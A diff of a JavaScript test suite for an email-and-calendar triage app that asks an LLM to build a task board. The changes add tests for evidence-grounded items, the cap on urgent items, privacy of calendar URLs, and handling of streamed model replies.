@@ -12,7 +12,7 @@ process.env.ZELOS_HOME = path.join(HOME_ROOT, 'home');
 
 const {
   open, close, migrate,
-  getItemByKey, itemRowId, setItemState, listBoard, bucketCounts,
+  getItemByKey, itemRowId, messageRowId, upsertItem, setItemState, listBoard, bucketCounts,
   listMessages, listEvents, insertCapture, listCaptures,
   getRun, getKV, setKV, startRun, finishRun,
 } = await import('../core/db.mjs');
@@ -67,7 +67,7 @@ async function closedPort() {
  * path on purpose, against a real socket on 127.0.0.1 speaking real IMAP.
  * ------------------------------------------------------------------ */
 
-const HEADER_SECTION = 'HEADER.FIELDS (FROM TO CC SUBJECT DATE MESSAGE-ID IN-REPLY-TO REFERENCES LIST-ID)';
+const HEADER_SECTION = 'HEADER.FIELDS (FROM REPLY-TO TO CC SUBJECT DATE MESSAGE-ID IN-REPLY-TO REFERENCES LIST-ID)';
 const PLAIN_TEXT_STRUCTURE = '("TEXT" "PLAIN" ("CHARSET" "UTF-8") NIL NIL "7BIT" 120 4 NIL NIL NIL NIL)';
 const MOCK_HEADERS = [
   'From: Priya Raman <priya@raman.example>',
@@ -273,8 +273,8 @@ function fetched(over = {}) {
        now and `runSweep` takes no clock, so a fixed date here fell out of
        every prompt assertion three weeks after it was written. */
     date: new Date(Date.now() - 3_600_000).toISOString(),
-    snippet: 'Either the 28th or the 30th works',
-    text: 'Either the 28th or the 30th works on our end.',
+    snippet: 'Please confirm the walkthrough dates.',
+    text: 'Please confirm the walkthrough dates.',
     hasAttachments: false,
     flags: [],
     folder: 'INBOX',
@@ -303,20 +303,21 @@ function fakeModel(reply) {
 const SECRETS = async () => 'a-password';
 
 function board(items, over = {}) {
-  return { first: null, items, notes: ['A quiet morning.'], ...over };
+  return { first: null, items, notes: [], ...over };
 }
 
 function item(over = {}) {
   return {
     key: 'thread-a',
-    bucket: 'waiting',
-    headline: 'Answer Priya Raman on the Jul 28 dates',
+    bucket: 'soon',
+    headline: 'Answer Priya Raman on the walkthrough dates',
     why: 'He offered two dates and has had no reply.',
     person: 'Priya Raman',
     personEmail: 'john@raman.example',
     dueAt: null,
     severity: 2,
-    sourceRefs: [],
+    sourceRefs: [`msg:${messageRowId('m_work', 1, '<a@example.com>')}`],
+    evidence: { ref: `msg:${messageRowId('m_work', 1, '<a@example.com>')}`, quote: 'Please confirm the walkthrough dates.' },
     link: null,
     ...over,
   };
@@ -328,7 +329,7 @@ function item(over = {}) {
 
 test('a full run fetches, persists, thinks and merges', async () => {
   const db = fresh();
-  const model = fakeModel(board([item(), item({ key: 'k2', bucket: 'today', headline: 'Draw the retainage figure' })]));
+  const model = fakeModel(board([item(), item({ key: 'k2', bucket: 'today', headline: 'Draw the retainage figure' })], { notes: ['An unverified model observation.'] }));
   const config = baseConfig({ mail: [mailAccount()] });
 
   const phases = [];
@@ -341,7 +342,7 @@ test('a full run fetches, persists, thinks and merges', async () => {
       complete: model,
       fetchMail: async ({ mailbox }) =>
         mailbox === 'Sent'
-          ? [fetched({ uid: 9, messageId: '<s@example.com>', threadKey: 'thread-a', folder: 'Sent', subject: 'Re: Dates', text: "I'll confirm tomorrow." })]
+          ? [fetched({ uid: 9, messageId: '<s@example.com>', threadKey: 'thread-a', folder: 'Sent', from: { name: 'Nemo', email: 'nemo@example.com' }, to: [{ name: 'Priya Raman', email: 'john@raman.example' }], subject: 'Re: Dates', text: "I'll confirm tomorrow." })]
           : [fetched(), fetched({ uid: 2, messageId: '<b@example.com>', threadKey: 'thread-b', subject: 'Invoice 4471' })],
     },
   });
@@ -356,7 +357,7 @@ test('a full run fetches, persists, thinks and merges', async () => {
   assert.ok(result.stats.ms >= 0);
   assert.equal(listMessages(db).length, 3);
   assert.ok(getItemByKey(db, 'thread-a'));
-  assert.deepEqual(result.notes, ['A quiet morning.']);
+  assert.deepEqual(result.notes, [], 'unverified model notes are not published');
 
   // The sent mailbox is read too — `promised` cannot exist without it.
   const out = listMessages(db, { direction: 'out' });
@@ -374,7 +375,7 @@ test('a full run fetches, persists, thinks and merges', async () => {
   assert.equal(run.tokens_in, 1234);
 });
 
-test('the four-item now bar holds end to end, through a real model reply', async () => {
+test('a model cannot invent urgency even when its reply is wrapped in prose', async () => {
   const db = fresh();
   const six = [0, 1, 2, 3, 4, 5].map((i) => item({
     key: `urgent-${i}`,
@@ -388,20 +389,20 @@ test('the four-item now bar holds end to end, through a real model reply', async
   const result = await runSweep({
     db,
     config: baseConfig({ mail: [mailAccount()] }),
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, true, result.error);
-  assert.equal(result.stats.now, 4, 'exactly four survive as now');
+  assert.equal(result.stats.now, 0, 'source evidence does not establish immediate urgency');
   const counts = bucketCounts(db);
-  assert.equal(counts.now, 4);
-  assert.equal(counts.today, 2, 'the other two were demoted, not deleted');
+  assert.equal(counts.now, 0);
+  assert.equal(counts.today, 0, 'no exact deadline was supplied');
+  assert.equal(counts.soon, 6, 'verified requests remain available without invented urgency');
   assert.equal(listBoard(db).length, 6);
-  assert.equal(getItemByKey(db, 'urgent-0').bucket, 'today');
-  assert.equal(getItemByKey(db, 'urgent-5').bucket, 'now');
+  for (const row of listBoard(db)) assert.equal(row.severity, 1, 'model severity is replaced by verified evidence');
 });
 
-/** Four legal `now` items under one prefix — one whole reply's worth. */
+/** User-created priority items test the persisted board cap independently of model grounding. */
 function fourNow(prefix, severity) {
   return [0, 1, 2, 3].map((i) => item({
     key: `${prefix}-${i}`,
@@ -411,19 +412,24 @@ function fourNow(prefix, severity) {
   }));
 }
 
-test('the four-item now bar holds on the persisted board, not only per model reply', async () => {
+function seedUserItems(db, items) {
+  for (const value of items) upsertItem(db, { ...value, sourceRefs: [], payload: { key: value.key } }, { origin: 'user' });
+}
+
+test('the four-item now bar holds across user-created work on the persisted board', async () => {
   const db = fresh();
-  // Two runs, disjoint keys, each reply perfectly legal on its own. safety.mjs
-  // clamps a reply; nothing used to clamp the board, so this left eight open
-  // `now` items and made the loudest thing the product says untrue.
-  const model = fakeModel((call) => board(call === 1 ? fourNow('older', 1) : fourNow('newer', 3)));
+  // User-created work can accumulate between reviews. The cap applies to the
+  // persisted board even when a grounded review has no new items to add.
+  const model = fakeModel(board([]));
+  seedUserItems(db, fourNow('older', 1));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   const first = await runSweep({ db, config, mode: 'full', deps });
   assert.equal(first.stats.now, 4, 'four on their own are within the bar');
   assert.equal(bucketCounts(db).now, 4);
 
+  seedUserItems(db, fourNow('newer', 3));
   const second = await runSweep({ db, config, mode: 'full', deps });
 
   assert.equal(second.ok, true, second.error);
@@ -448,13 +454,15 @@ test('the four-item now bar holds on the persisted board, not only per model rep
 
 test('the board-level now bar demotes open items only, never a decision the user made', async () => {
   const db = fresh();
-  const model = fakeModel((call) => board(call === 1 ? fourNow('older', 1) : fourNow('newer', 3)));
+  const model = fakeModel(board([]));
+  seedUserItems(db, fourNow('older', 1));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
   setItemState(db, itemRowId('older-0'), 'snoozed');
   setItemState(db, itemRowId('older-1'), 'done');
+  seedUserItems(db, fourNow('newer', 3));
 
   await runSweep({ db, config, mode: 'full', deps });
 
@@ -471,11 +479,13 @@ test('the board-level now bar demotes open items only, never a decision the user
 
 test('a light run holds the bar too, without asking the model anything', async () => {
   const db = fresh();
-  const model = fakeModel((call) => board(call === 1 ? fourNow('older', 1) : fourNow('newer', 3)));
+  const model = fakeModel(board([]));
+  seedUserItems(db, fourNow('older', 1));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
+  seedUserItems(db, fourNow('newer', 3));
   await runSweep({ db, config, mode: 'full', deps });
   // Put the board back over the bar behind the sweep's back, the way the user
   // reopening two demoted items does.
@@ -504,12 +514,13 @@ test('the demo week yields the now bar to real severity-3 work', async () => {
     key: `real-${i}`, bucket: 'now', severity: 3, dueAt: due(30 + i),
     headline: `Deal with the real thing number ${i}`,
   }));
-  const model = fakeModel(board(three));
+  seedUserItems(db, three);
+  const model = fakeModel(board([]));
   const result = await runSweep({
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, true, result.error);
@@ -530,7 +541,7 @@ test('a finished item\'s key is named to the next run as already handled', async
   const db = fresh();
   const model = fakeModel(board([item()]));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
   setItemState(db, itemRowId('thread-a'), 'done');
@@ -542,7 +553,7 @@ test('a finished item\'s key is named to the next run as already handled', async
     'nothing is claimed to be handled on the run that had nothing to handle');
   assert.match(secondPrompt, /ALREADY HANDLED — DO NOT RAISE THESE AGAIN/);
   assert.match(secondPrompt, /key=thread-a · done/);
-  assert.ok(secondPrompt.includes('Answer Priya Raman on the Jul 28 dates'),
+  assert.ok(secondPrompt.includes(getItemByKey(db, 'thread-a').headline),
     'the headline travels with the key, so the same obligation is recognisable in other words');
 });
 
@@ -562,7 +573,7 @@ test('the most recently closed item survives the limit whatever offset it was cl
 
   const first = fakeModel(board([...keys, LATE].map((key) => item({ key, headline: `Finish ${key}` }))));
   const config = baseConfig({ mail: [mailAccount()] });
-  const fetchMail = async () => [fetched()];
+  const fetchMail = async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()];
   await runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS, complete: first, fetchMail } });
 
   /** The same instant, written the way a user in that zone would see it. */
@@ -599,7 +610,7 @@ test('a busy three weeks of finished work is fenced off whole, not just the last
   const keys = [...Array(60).keys()].map((i) => `finished-${String(i).padStart(2, '0')}`);
   const first = fakeModel(board(keys.map((key) => item({ key, headline: `Finish ${key}` }))));
   const config = baseConfig({ mail: [mailAccount()] });
-  const fetchMail = async () => [fetched()];
+  const fetchMail = async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()];
   await runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS, complete: first, fetchMail } });
   for (const key of keys) setItemState(db, itemRowId(key), 'done');
 
@@ -614,7 +625,7 @@ test('a busy three weeks of finished work is fenced off whole, not just the last
 
 test('a model that is told what was handled does not resurrect it under a new key', async () => {
   const db = fresh();
-  const WORK = 'Answer Priya Raman on the Jul 28 dates';
+  const WORK = 'Review Priya Raman: Dates for the walkthrough';
   // A stand-in for a model that follows its instructions: the mail that produced
   // this obligation is still in front of it every run, so it writes the item up
   // again — under a fresh key, because a finished key is not on the prior board —
@@ -627,7 +638,7 @@ test('a model that is told what was handled does not resurrect it under a new ke
     return board(toldItIsHandled ? [] : [item({ key: 'thread-a-again', headline: WORK })]);
   });
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
   setItemState(db, itemRowId('thread-a'), 'done');
@@ -652,7 +663,7 @@ test('a successful run records what it spent where the UI can read it', async ()
   const db = fresh();
   const model = fakeModel(board([item()]));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
   const afterOne = JSON.parse(getKV(db, SWEEP_KV.tokens));
@@ -687,7 +698,7 @@ test('a successful run records what it spent where the UI can read it', async ()
 test('a run that failed still records what the model was paid for', async () => {
   const db = fresh();
   const config = baseConfig({ mail: [mailAccount()] });
-  const fetchMail = async () => [fetched()];
+  const fetchMail = async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()];
 
   await runSweep({
     db, config, mode: 'full',
@@ -743,7 +754,7 @@ test('a token counter that cannot be written does not cost the user the board', 
     db: brittle,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: fakeModel(board([item()])), fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: fakeModel(board([item()])), fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, true, result.error);
@@ -756,7 +767,7 @@ test('the token totals start again on a new day rather than growing forever', as
   const db = fresh();
   const model = fakeModel(board([item()]));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
   const yesterday = { ...JSON.parse(getKV(db, SWEEP_KV.tokens)), day: '2000-01-01' };
@@ -776,7 +787,7 @@ test('what the user decided survives the next run', async () => {
   const db = fresh();
   const model = fakeModel(board([item(), item({ key: 'k2', bucket: 'today', headline: 'Draw the retainage figure' })]));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
   const id = itemRowId('thread-a');
@@ -797,7 +808,11 @@ test('one dead source does not cost the run the others', async () => {
   const deadPort = await closedPort();
   const startsAt = Date.now() + 26 * 3_600_000;
   const cal = await icsServer(icsDocument(startsAt));
-  const model = fakeModel(board([item({ key: 'evt-precon', bucket: 'today', headline: 'Bring the retainage figure to the pre-con' })]));
+  const model = fakeModel(() => {
+    const ref = `evt:${listEvents(db)[0].id}`;
+    return board([item({ key: 'evt-precon', bucket: 'soon', sourceRefs: [ref],
+      evidence: { ref, quote: 'Bring the retainage figure' } })]);
+  });
 
   const config = baseConfig({
     // A real IMAP client against a port with nothing behind it.
@@ -823,6 +838,24 @@ test('one dead source does not cost the run the others', async () => {
   assert.equal(listEvents(db).length, 1);
   assert.equal(listEvents(db)[0].title, 'Pre-con with Alder & Vance');
   assert.equal(model.calls.length, 1, 'the model still got to think about what did arrive');
+});
+
+test('an unnamed calendar never uses its private subscription URL as a diagnostic label', async () => {
+  const db = fresh();
+  const privateUrl = 'https://calendar.example.invalid/private-ical-token-9372/basic.ics?token=fictional-5291';
+  for (const label of ['', 'Family calendar']) {
+    const progress = [];
+    const result = await runSweep({ db, mode: 'light', onProgress: event => progress.push(event),
+      config: baseConfig({ calendars: [{ id: 'c_private', enabled: true, kind: 'ics', label, url: privateUrl }] }),
+      deps: { getSecret: SECRETS, fetchEvents: async () => { throw new Error('Fixture calendar unavailable'); } },
+    });
+    const source = result.stats.sources[0];
+    assert.equal(source.ok, false);
+    assert.ok(source.label && source.label !== privateUrl);
+    if (label) assert.equal(source.label, label, 'an explicitly chosen label survives');
+    const visible = JSON.stringify({ result, progress, stored: getRun(db, result.runId) });
+    assert.ok(!visible.includes('private-ical-token-9372') && !visible.includes('fictional-5291'));
+  }
 });
 
 test('a calendar whose kind names no reader is still read as a subscribed .ics', async () => {
@@ -854,7 +887,7 @@ test('an account with no stored password is reported, not crashed on', async () 
   const result = await runSweep({
     db,
     config: baseConfig({ mail: [mailAccount()] }),
-    deps: { getSecret: async () => null, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: async () => null, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
   const source = result.stats.sources.find((s) => s.kind === 'mail');
   assert.equal(source.ok, false);
@@ -1013,7 +1046,7 @@ test('a light run reads the sources and calls no model at all', async () => {
   const db = fresh();
   const model = fakeModel(board([item()]));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   const result = await runSweep({ db, config, mode: 'light', deps });
 
@@ -1029,7 +1062,7 @@ test('an auto run goes full for new mail and light when nothing changed', async 
   const db = fresh();
   const model = fakeModel(board([item()]));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   const first = await runSweep({ db, config, mode: 'auto', deps });
   assert.equal(first.stats.kind, 'full', 'a first run always thinks');
@@ -1080,7 +1113,9 @@ test('privacy.sendBodies:false reaches the model as a prompt with no body text',
 test('captures are triaged, then marked processed — but only the ones that were sent', async () => {
   const db = fresh();
   const capture = insertCapture(db, 'Call the bank about the retainage line');
-  const model = fakeModel(board([item({ key: 'cap-bank', bucket: 'today', headline: 'Call the bank about retainage' })]));
+  const ref = `cap:${capture.id}`;
+  const model = fakeModel(board([item({ key: 'cap-bank', bucket: 'soon', sourceRefs: [ref],
+    evidence: { ref, quote: 'Call the bank about the retainage line' } })]));
 
   await runSweep({ db, config: baseConfig(), mode: 'full', deps: { getSecret: SECRETS, complete: model } });
 
@@ -1110,7 +1145,7 @@ test('a model that answers with something other than JSON fails the run honestly
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, false);
@@ -1131,7 +1166,7 @@ test('a parseable but wrong-shape reply fails the run and consumes nothing', asy
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, false);
@@ -1155,7 +1190,7 @@ test('a board whose items are unusable fails the run instead of quietly emptying
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, false);
@@ -1181,13 +1216,186 @@ test('a reply cut off at the token limit says so, and says what to raise', async
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, false);
   assert.match(result.error, /cut off/i, 'the error must say the reply was truncated');
-  assert.match(result.error, /maxTokens/, 'and point at the setting that fixes it');
+  assert.match(result.error, /Response limit \(tokens\) in Settings → AI → Advanced/, 'and point at the setting that fixes it');
   assert.ok(!/larger model/.test(result.error), 'a bigger model would be the wrong advice');
+});
+
+test('sweeps stream Anthropic and local OpenAI only, preserving JSON and output budgets', async () => {
+  for (const [protocol, baseUrl, expected] of [
+    ['anthropic', 'https://api.example.invalid', true],
+    ['anthropic', 'http://127.0.0.1:11434', true],
+    ['openai', 'http://127.0.0.1:11434/v1', true],
+    ['openai', 'http://192.168.1.8:11434/v1', true],
+    ['openai', 'https://api.example.invalid/v1', false],
+  ]) {
+    const injected = fakeModel(board([]));
+    const config = baseConfig();
+    config.model = { ...config.model, protocol, baseUrl, maxTokens: 16384 };
+    const result = await runSweep({ db: fresh(), config, mode: 'full', deps: { getSecret: SECRETS, complete: injected } });
+    assert.equal(result.ok, true);
+    assert.equal(injected.calls.length, 1);
+    assert.equal(injected.calls[0].stream, expected, `${protocol} ${baseUrl}`);
+    assert.equal(injected.calls[0].json, true);
+    assert.equal(injected.calls[0].maxTokens, 16384);
+  }
+});
+
+test('full Claude and local OpenAI reviews collect streams while injected completions keep working', async () => {
+  const requests = [];
+  const captureText = 'Call the bank about the retainage line';
+  let reportPrefix;
+  let releaseTerminal;
+  const prefix = new Promise((resolve) => { reportPrefix = resolve; });
+  const terminal = new Promise((resolve) => { releaseTerminal = resolve; });
+  const server = http.createServer(async (req, res) => {
+    const parts = [];
+    for await (const part of req) parts.push(part);
+    const body = JSON.parse(Buffer.concat(parts).toString());
+    requests.push(body);
+    const shown = body.messages.map((message) => message.content).join('\n');
+    const ref = shown.match(/\[cap:([^\]]+)\]/)?.[0].slice(1, -1);
+    assert.ok(ref, 'the mock can only cite the capture sent in this request');
+    const response = JSON.stringify(board([item({ key: 'stream-capture', bucket: 'soon', sourceRefs: [ref], evidence: { ref, quote: captureText } })]));
+    if (body.stream) {
+      res.writeHead(200, { 'content-type': 'text/event-stream' });
+      const frame = (data) => res.write(`data: ${JSON.stringify(data)}\n\n`);
+      const anthropic = req.url.endsWith('/messages');
+      if (anthropic) {
+        frame({ type: 'message_start', message: { model: body.model, usage: { input_tokens: 2000 } } });
+        frame({ type: 'content_block_delta', delta: { type: 'thinking_delta', thinking: 'synthetic private reasoning' } });
+        frame({ type: 'content_block_delta', delta: { type: 'text_delta', text: response } });
+      } else {
+        frame({ model: body.model, choices: [{ delta: { reasoning: 'synthetic private reasoning' } }] });
+        frame({ choices: [{ delta: { content: response } }] });
+      }
+      reportPrefix();
+      await terminal;
+      if (anthropic) {
+        frame({ type: 'message_delta', delta: { stop_reason: 'end_turn' }, usage: { output_tokens: 10000 } });
+        frame({ type: 'message_stop' });
+      } else {
+        frame({ choices: [{ delta: {}, finish_reason: 'stop' }], usage: { prompt_tokens: 2000, completion_tokens: 10000 } });
+        res.write('data: [DONE]\n\n');
+      }
+      res.end();
+    } else {
+      res.writeHead(200, { 'content-type': 'application/json' });
+      res.end(JSON.stringify({
+        content: [{ type: 'text', text: response }], stop_reason: 'end_turn',
+        choices: [{ message: { content: response }, finish_reason: 'stop' }],
+        usage: { input_tokens: 2000, output_tokens: 10000, prompt_tokens: 2000, completion_tokens: 10000 },
+      }));
+    }
+  });
+  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+  servers.push(server);
+  for (const protocol of ['anthropic', 'openai']) {
+    const db = fresh();
+    insertCapture(db, captureText);
+    const config = baseConfig();
+    config.model = { ...config.model, protocol, baseUrl: `http://127.0.0.1:${server.address().port}`, maxTokens: 32768 };
+    const running = runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS } });
+    if (protocol === 'anthropic') {
+      await prefix;
+      try { assert.equal(listBoard(db).length, 0, 'even balanced JSON waits for provider completion'); }
+      finally { releaseTerminal(); }
+    }
+    const result = await running;
+    assert.equal(result.ok, true);
+    assert.equal(listBoard(db).length, 1);
+    assert.equal(requests.at(-1).stream, true);
+    assert.equal(requests.at(-1).max_tokens, 32768);
+    assert.equal(result.stats.tokensIn, 2000);
+    assert.equal(result.stats.tokensOut, 10000);
+  }
+  assert.equal(requests.length, 2);
+
+  const injected = fakeModel(board([]));
+  const config = baseConfig();
+  config.model.protocol = 'anthropic';
+  const result = await runSweep({ db: fresh(), config, mode: 'full', deps: { getSecret: SECRETS, complete: injected } });
+  assert.equal(result.ok, true);
+  assert.equal(injected.calls.length, 1);
+  assert.equal(injected.calls[0].stream, true);
+});
+
+test('a failed Claude stream never merges its balanced board prefix', async (t) => {
+  for (const ending of ['EOF', 'error', 'length']) await t.test(ending, async () => {
+    let requests = 0;
+    const server = http.createServer(async (req, res) => {
+      for await (const _part of req) { /* consume the request */ }
+      requests += 1;
+      res.writeHead(200, { 'content-type': 'text/event-stream' });
+      const frame = (data) => res.write(`data: ${JSON.stringify(data)}\n\n`);
+      frame({ type: 'message_start', message: { model: 'claude-sonnet-5', usage: { input_tokens: 2000 } } });
+      frame({ type: 'content_block_delta', delta: { type: 'text_delta', text: JSON.stringify(board([item()])) } });
+      if (ending === 'error') frame({ type: 'error', error: { message: 'synthetic interruption' } });
+      if (ending === 'length') {
+        frame({ type: 'message_delta', delta: { stop_reason: 'max_tokens' }, usage: { output_tokens: 32768 } });
+        frame({ type: 'message_stop' });
+      }
+      res.end();
+    });
+    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+    servers.push(server);
+    const db = fresh();
+    insertCapture(db, 'Call the bank');
+    const config = baseConfig({ mail: [mailAccount()] });
+    config.model = { ...config.model, protocol: 'anthropic', baseUrl: `http://127.0.0.1:${server.address().port}`, maxTokens: 32768 };
+    const result = await runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] } });
+    assert.equal(result.ok, false);
+    assert.equal(requests, 1, 'do not repeat a generation after its stream started');
+    assert.match(result.error, ending === 'EOF' ? /before the answer was complete/ : ending === 'error' ? /synthetic interruption/ : /cut off/);
+    assert.equal(listBoard(db).length, 0);
+    assert.equal(listCaptures(db, { includeProcessed: false }).length, 1);
+    assert.equal(getKV(db, SWEEP_KV.pendingNew), '1');
+    if (ending === 'length') assert.equal(getRun(db, result.runId).tokens_out, 32768);
+  });
+});
+
+test('a token-limited balanced board is rejected before merge and retains pending work and usage', async () => {
+  const db = fresh();
+  insertCapture(db, 'Call the bank');
+  const result = await runSweep({
+    db, config: baseConfig({ mail: [mailAccount()] }), mode: 'full',
+    deps: {
+      getSecret: SECRETS, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()],
+      complete: async () => ({ text: JSON.stringify(board([item()])), usage: { input: 2000, output: 32768 }, stopReason: 'length' }),
+    },
+  });
+  assert.equal(result.ok, false);
+  assert.match(result.error, /Response limit \(tokens\)/);
+  assert.equal(listBoard(db).length, 0);
+  assert.equal(listCaptures(db, { includeProcessed: false }).length, 1);
+  assert.equal(getKV(db, SWEEP_KV.pendingNew), '1');
+  assert.equal(getRun(db, result.runId).tokens_out, 32768);
+});
+
+test('cancellation at model completion preserves the board and pending work', async () => {
+  const db = fresh();
+  insertCapture(db, 'Call the bank');
+  const controller = new AbortController();
+  const result = await runSweep({
+    db, config: baseConfig({ mail: [mailAccount()] }), mode: 'full', signal: controller.signal,
+    deps: {
+      getSecret: SECRETS, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()],
+      complete: async () => {
+        controller.abort();
+        return { text: JSON.stringify(board([item()])), usage: { input: 2000, output: 7000 }, stopReason: 'stop' };
+      },
+    },
+  });
+  assert.equal(result.ok, false);
+  assert.match(result.error, /cancelled/);
+  assert.equal(listBoard(db).length, 0);
+  assert.equal(listCaptures(db, { includeProcessed: false }).length, 1);
+  assert.equal(getKV(db, SWEEP_KV.pendingNew), '1');
+  assert.equal(getRun(db, result.runId).tokens_out, 7000);
 });
 
 test('the demo week never reaches the model once real sources exist', async () => {
@@ -1198,7 +1406,7 @@ test('the demo week never reaches the model once real sources exist', async () =
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(model.calls.length, 1);
@@ -1223,7 +1431,7 @@ test('a model that cannot be reached fails the run without losing the fetch', as
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
 
   assert.equal(result.ok, false);
@@ -1235,7 +1443,7 @@ test('the prior board is handed back to the model on the next run', async () => 
   const db = fresh();
   const model = fakeModel(board([item()]));
   const config = baseConfig({ mail: [mailAccount()] });
-  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };
+  const deps = { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] };
 
   await runSweep({ db, config, mode: 'full', deps });
   await runSweep({ db, config, mode: 'full', deps });
@@ -1343,7 +1551,7 @@ test('a successful full run clears the pending-new counter', async () => {
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
